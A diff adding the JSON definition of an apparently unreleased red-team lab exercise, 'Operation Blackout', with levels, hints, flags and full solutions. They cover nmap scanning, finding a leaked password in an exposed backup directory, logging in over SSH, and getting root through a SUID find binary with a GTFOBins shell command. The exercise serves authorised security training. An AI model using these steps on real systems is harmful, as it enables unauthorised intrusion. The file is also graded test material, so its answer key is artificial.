@@ -1,0 +1,227 @@
+{
+  "title" : "Red Team & Pentest: Operation Blackout",
+  "description" : "Step into the shoes of a red-team operator. From your Kali workstation, run reconnaissance against a corporate server, enumerate its web service, harvest leaked credentials, gain a foothold over SSH and escalate to root.",
+  "prerequisites" : [ ],
+  "outcomes" : [ "Reconnaissance", "Enumeration", "Initial Access", "Privilege Escalation" ],
+  "state" : "UNRELEASED",
+  "show_stepper_bar" : true,
+  "levels" : [ {
+    "title" : "Introduction level",
+    "level_type" : "INFO_LEVEL",
+    "order" : 0,
+    "estimated_duration" : 0,
+    "minimal_possible_solve_time" : null,
+    "content" : "# Welcome, operator!\n### This training puts you on the offensive side of a security engagement. You will use a **Kali Linux** workstation to attack a corporate server belonging to **Initech Corp** as part of an authorised red-team exercise.\n\n### The mission - codename **Operation Blackout** - is a full kill-chain in miniature:\n- ### **Reconnaissance** - map the target's exposed services\n- ### **Enumeration** - dig through the web service for mistakes\n- ### **Initial Access** - turn leaked credentials into a shell\n- ### **Privilege Escalation** - abuse a misconfiguration to become **root**\n\n### Everything happens inside an isolated lab. Let's begin. :)\n"
+  }, {
+    "title" : "Get Access",
+    "level_type" : "ACCESS_LEVEL",
+    "order" : 1,
+    "estimated_duration" : 0,
+    "minimal_possible_solve_time" : null,
+    "passkey" : "start",
+    "cloud_content" : "# First, let's get onto the Kali Linux workstation we will be attacking from!\n## 1. On your right, a topology window shows the available machines and networks.\n - ### You have access to the **kali** machine (if you don't see it right away, click the switches and it should appear).\n - ### **Right click** the **kali** machine and select **console (deprecated)** to open a desktop session.\n - ### Your login credentials are: **Sandy** / **sandypass**.\n - ### The workstation is a full Kali desktop and is also reachable over **VNC** at **10.1.30.5:5901** if you prefer a remote-desktop viewer.\n\n## 2. Once logged in, open a **terminal**.\n - ### The target server lives at **10.1.31.10** (aliased as **target**).\n - ### When you are ready, type **start** in the box below to begin the engagement! :)\n",
+    "local_content" : "# Access the Kali Workstation\n\n## 1. Connect to the kali machine.\n- Your login credentials are: **Sandy** / **sandypass**\n- Remote desktop is available over VNC at **10.1.30.5:5901**.\n\n## 2. Open a terminal.\n- The target server is **10.1.31.10** (alias **target**).\n- When you are ready, type **start** in the box below to continue."
+  }, {
+    "title" : "Reconnaissance",
+    "level_type" : "TRAINING_LEVEL",
+    "order" : 2,
+    "estimated_duration" : 5,
+    "minimal_possible_solve_time" : null,
+    "answer" : "nmap -sV 10.1.31.10",
+    "answer_variable_name" : null,
+    "content" : "### Every engagement starts with **reconnaissance**. Before you can attack Initech's server, you need to know what it is running.\n### The target's IP address is **10.1.31.10**.\n\n### Your objective is:\n- #### to use a port-scanning tool\n- #### with the argument that fingerprints the **running services and their versions**\n- #### against the target server\n\n### **Type the full command in the answer box!**",
+    "solution" : "This command scans the target and prints the service/version behind each open port:\n\n``nmap -sV 10.1.31.10``   <- the answer\n\nYou should see **22/ssh** and **80/http** open.",
+    "solution_penalized" : true,
+    "hints" : [ {
+      "title" : "The tool",
+      "content" : "#### The classic tool for discovering open ports and services is **nmap**.",
+      "hint_penalty" : 1,
+      "order" : 0
+    }, {
+      "title" : "The argument",
+      "content" : "#### The flag **-sV** enables **service/version detection** so you see exactly what is listening.",
+      "hint_penalty" : 1,
+      "order" : 1
+    } ],
+    "incorrect_answer_limit" : 10,
+    "attachments" : [ ],
+    "max_score" : 10,
+    "variant_answers" : false,
+    "reference_solution" : [ ],
+    "mitre_techniques" : [ ],
+    "expected_commands" : [ ],
+    "commands_required" : false
+  }, {
+    "title" : "Web Enumeration",
+    "level_type" : "TRAINING_LEVEL",
+    "order" : 3,
+    "estimated_duration" : 5,
+    "minimal_possible_solve_time" : null,
+    "answer" : "/backup/",
+    "answer_variable_name" : null,
+    "content" : "### Your scan revealed an **HTTP** service on port **80**. Web servers are a goldmine - admins often leave behind files they think nobody will find.\n### A good first move is to read the **robots.txt** file, where lazy admins list the very directories they want hidden. ;)\n\n### Your objective:\n- #### request the **robots.txt** file from the target's web server\n- #### find the directory the admin tried to hide\n\n### The flag is the **disallowed path** exactly as it appears in robots.txt (including the slashes).",
+    "solution" : "``curl http://10.1.31.10/robots.txt``\n\nThe file contains:\n\n``Disallow: /backup/``\n\nSo the answer is:\n\n``/backup/`` <- the answer",
+    "solution_penalized" : true,
+    "hints" : [ {
+      "title" : "Where to look",
+      "content" : "#### Almost every web server has a **/robots.txt** file. Fetch it with **curl http://10.1.31.10/robots.txt** or open it in the browser.",
+      "hint_penalty" : 2,
+      "order" : 0
+    }, {
+      "title" : "What to submit",
+      "content" : "#### Look for the line starting with **Disallow:**. The value after it is the hidden directory.",
+      "hint_penalty" : 1,
+      "order" : 1
+    } ],
+    "incorrect_answer_limit" : 10,
+    "attachments" : [ ],
+    "max_score" : 10,
+    "variant_answers" : false,
+    "reference_solution" : [ ],
+    "mitre_techniques" : [ ],
+    "expected_commands" : [ ],
+    "commands_required" : true
+  }, {
+    "title" : "Harvesting Credentials",
+    "level_type" : "TRAINING_LEVEL",
+    "order" : 4,
+    "estimated_duration" : 4,
+    "minimal_possible_solve_time" : null,
+    "answer" : "P@ssw0rd2024",
+    "answer_variable_name" : null,
+    "content" : "### The hidden **/backup/** directory is exposed to the world. Inside it the admin left a notes file from a migration window.\n### Browse the directory, open the file, and read what was left behind. :)\n\n### Your objective:\n- #### list / browse the contents of the **/backup/** directory\n- #### open the notes file you find there\n- #### extract the **SSH password** for the service account\n\n### The flag is the **password** for the **operator** account.",
+    "solution" : "``curl http://10.1.31.10/backup/``  (lists the directory)\n\n``curl http://10.1.31.10/backup/notes.txt``\n\nThe notes reveal:\n\nuser: operator  \npass: **P@ssw0rd2024** <- the answer",
+    "solution_penalized" : true,
+    "hints" : [ {
+      "title" : "Reading the directory",
+      "content" : "#### The directory has indexing on. Fetch **http://10.1.31.10/backup/** to see the files, then read **notes.txt**.",
+      "hint_penalty" : 2,
+      "order" : 0
+    }, {
+      "title" : "What to submit",
+      "content" : "#### The notes list a username (**operator**) and a password. Submit the **password** value.",
+      "hint_penalty" : 1,
+      "order" : 1
+    } ],
+    "incorrect_answer_limit" : 10,
+    "attachments" : [ ],
+    "max_score" : 10,
+    "variant_answers" : false,
+    "reference_solution" : [ ],
+    "mitre_techniques" : [ ],
+    "expected_commands" : [ ],
+    "commands_required" : true
+  }, {
+    "title" : "Initial Access",
+    "level_type" : "TRAINING_LEVEL",
+    "order" : 5,
+    "estimated_duration" : 5,
+    "minimal_possible_solve_time" : null,
+    "answer" : "ssh operator@10.1.31.10",
+    "answer_variable_name" : null,
+    "content" : "### You now hold valid credentials: **operator** / **P@ssw0rd2024**. Time to turn that leak into a real foothold on the server.\n\n### Your objective:\n- #### use the leaked credentials to open an **SSH** session on the target as **operator**\n\n### The flag is the **full SSH command** you use to log in.\n(When prompted, the password is **P@ssw0rd2024**.)",
+    "solution" : "``ssh operator@10.1.31.10`` <- the answer\n\npassword: **P@ssw0rd2024**\n\nYou now have an interactive shell on the target as the operator user.",
+    "solution_penalized" : true,
+    "hints" : [ {
+      "title" : "The command",
+      "content" : "#### Log in with **ssh <user>@<ip>**. The user is **operator** and the IP is **10.1.31.10**.",
+      "hint_penalty" : 2,
+      "order" : 0
+    }, {
+      "title" : "The password",
+      "content" : "#### When SSH asks for a password, enter the one you harvested: **P@ssw0rd2024**.",
+      "hint_penalty" : 1,
+      "order" : 1
+    } ],
+    "incorrect_answer_limit" : 10,
+    "attachments" : [ ],
+    "max_score" : 10,
+    "variant_answers" : false,
+    "reference_solution" : [ ],
+    "mitre_techniques" : [ ],
+    "expected_commands" : [ ],
+    "commands_required" : true
+  }, {
+    "title" : "Finding a Way Up",
+    "level_type" : "TRAINING_LEVEL",
+    "order" : 6,
+    "estimated_duration" : 5,
+    "minimal_possible_solve_time" : null,
+    "answer" : "find / -perm -4000 2>/dev/null",
+    "answer_variable_name" : null,
+    "content" : "### You are on the box, but only as the low-privileged **operator**. To finish the mission you need **root**.\n### A common path up is an **SUID** binary - a program that runs with its owner's privileges. If a powerful tool is mistakenly SUID-root, you can abuse it.\n\n### Your objective:\n- #### from your operator shell, **search the whole filesystem for SUID binaries**\n- #### the standard one-liner sends errors to /dev/null so the output stays clean\n\n### The flag is the **full command** that lists every SUID binary on the system.",
+    "solution" : "``find / -perm -4000 2>/dev/null`` <- the answer\n\nAmong the results you will spot an unusual entry: **/usr/bin/find** is SUID root - that is your ticket up.",
+    "solution_penalized" : true,
+    "hints" : [ {
+      "title" : "The tool & flag",
+      "content" : "#### Use **find** with **-perm -4000** to match the SUID bit. Start the search at **/**.",
+      "hint_penalty" : 2,
+      "order" : 0
+    }, {
+      "title" : "Clean output",
+      "content" : "#### Append **2>/dev/null** to discard the 'Permission denied' noise so only real hits show.",
+      "hint_penalty" : 1,
+      "order" : 1
+    } ],
+    "incorrect_answer_limit" : 10,
+    "attachments" : [ ],
+    "max_score" : 10,
+    "variant_answers" : false,
+    "reference_solution" : [ ],
+    "mitre_techniques" : [ ],
+    "expected_commands" : [ ],
+    "commands_required" : true
+  }, {
+    "title" : "Privilege Escalation - Root!",
+    "level_type" : "TRAINING_LEVEL",
+    "order" : 7,
+    "estimated_duration" : 6,
+    "minimal_possible_solve_time" : null,
+    "answer" : "R3D-T34M-R00T",
+    "answer_variable_name" : null,
+    "content" : "### Your SUID hunt found that **/usr/bin/find** runs as **root**. According to **GTFOBins**, a SUID `find` can spawn a root shell.\n### Use it to escalate, then read the prize the engagement is after.\n\n### Your objective:\n- #### abuse the SUID **find** binary to drop into a **root shell**\n- #### read the flag stored at **/root/flag.txt**\n\n### The flag is the **contents of /root/flag.txt**.",
+    "solution" : "Spawn a root shell with the GTFOBins SUID-find technique (the **-p** keeps the elevated privileges):\n\n``find . -exec /bin/sh -p \\; -quit``\n\nThen confirm and grab the flag:\n\n``id``  -> uid=0(root)\n``cat /root/flag.txt``\n\n**R3D-T34M-R00T** <- the answer",
+    "solution_penalized" : true,
+    "hints" : [ {
+      "title" : "Spawning the shell",
+      "content" : "#### From GTFOBins, a SUID find gives a shell with: **find . -exec /bin/sh -p \\; -quit**. The **-p** flag preserves root privileges.",
+      "hint_penalty" : 2,
+      "order" : 0
+    }, {
+      "title" : "Getting the flag",
+      "content" : "#### Once **id** shows uid=0(root), read the file with **cat /root/flag.txt** and submit its contents.",
+      "hint_penalty" : 1,
+      "order" : 1
+    } ],
+    "incorrect_answer_limit" : 10,
+    "attachments" : [ ],
+    "max_score" : 15,
+    "variant_answers" : false,
+    "reference_solution" : [ ],
+    "mitre_techniques" : [ ],
+    "expected_commands" : [ ],
+    "commands_required" : true
+  }, {
+    "title" : "Mission Complete!",
+    "level_type" : "TRAINING_LEVEL",
+    "order" : 8,
+    "estimated_duration" : 1,
+    "minimal_possible_solve_time" : null,
+    "answer" : "good job",
+    "answer_variable_name" : null,
+    "content" : "## Operation Blackout is complete - you owned the box from a single open port to full root! :)\n\n### Let's recap the kill-chain you just executed:\n- #### **Recon** with nmap exposed the web and SSH services\n- #### **Enumeration** of robots.txt revealed a forgotten backup directory\n- #### **Harvested credentials** from a leaked notes file\n- #### **Initial access** via SSH with those credentials\n- #### **Privilege escalation** by abusing a SUID binary to reach root\n\n#### Each link in that chain was a small, avoidable mistake - an exposed file, a leaked password, a misconfigured permission. As a defender, breaking any one of them stops the whole attack. Always test from the attacker's perspective, and always operate ethically and with authorisation.\n\n### flag: **good job**",
+    "solution" : "good job\n:)",
+    "solution_penalized" : true,
+    "hints" : [ ],
+    "incorrect_answer_limit" : 10,
+    "attachments" : [ ],
+    "max_score" : 1,
+    "variant_answers" : false,
+    "reference_solution" : [ ],
+    "mitre_techniques" : [ ],
+    "expected_commands" : [ ],
+    "commands_required" : true
+  } ],
+  "estimated_duration" : 31,
+  "variant_sandboxes" : false
+}
